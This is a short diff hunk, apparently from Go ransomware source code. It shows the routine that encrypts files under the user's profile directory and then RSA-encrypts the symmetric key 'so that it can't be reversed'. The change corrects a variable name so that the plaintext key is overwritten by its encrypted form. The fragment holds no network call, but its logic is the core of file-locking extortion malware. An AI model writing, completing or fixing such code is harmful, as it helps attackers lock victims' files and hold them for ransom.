@@ -65,7 +65,7 @@ gwIDAQAB
 	files := EncryptSystem(os.Getenv("USERPROFILE"), targets, EncryptionKey)
 
 	// Encrypt the key so that it can't be reversed.
-	encryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
+	EncryptionKey = EncryptDataRSA(publicRSAKey, EncryptionKey)
 	for _, f := range files {
 		fmt.Println(f)
 	}
